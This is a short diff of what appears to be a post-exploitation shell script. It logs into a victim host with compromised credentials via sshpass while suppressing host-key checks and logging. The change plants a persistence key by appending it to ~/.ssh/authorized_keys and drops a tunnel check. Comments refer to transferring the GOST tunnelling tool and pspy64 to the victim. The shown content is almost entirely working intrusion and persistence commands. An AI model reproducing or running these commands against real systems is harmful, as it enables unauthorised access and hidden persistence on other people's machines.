@@ -90,14 +90,8 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  'whoami; hostname'
-
-sshpass -p "${COMPROMISED_PASS}" ssh-copy-id \
-  -i "${PERSIST_KEY}.pub" \
-  -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  -o LogLevel=ERROR \
-  "${COMPROMISED_USER}@${VICTIM_IP}"
+  'cat >> ~/.ssh/authorized_keys' \
+  < "${PERSIST_KEY}.pub"
 
 # ================================================
 # Transfer GOST to victim
@@ -138,20 +132,6 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
 
 sleep 3
 
-# ================================================
-# Tunnel check
-# ================================================
-
-ssh \
-  -i "${PERSIST_KEY}" \
-  -p 2223 \
-  -o BatchMode=yes \
-  -o PasswordAuthentication=no \
-  -o StrictHostKeyChecking=no \
-  -o UserKnownHostsFile=/dev/null \
-  -o LogLevel=ERROR \
-  "${COMPROMISED_USER}@127.0.0.1" \
-  'whoami; hostname'
 
 # ================================================
 # Transfer pspy64 through GOST tunnel
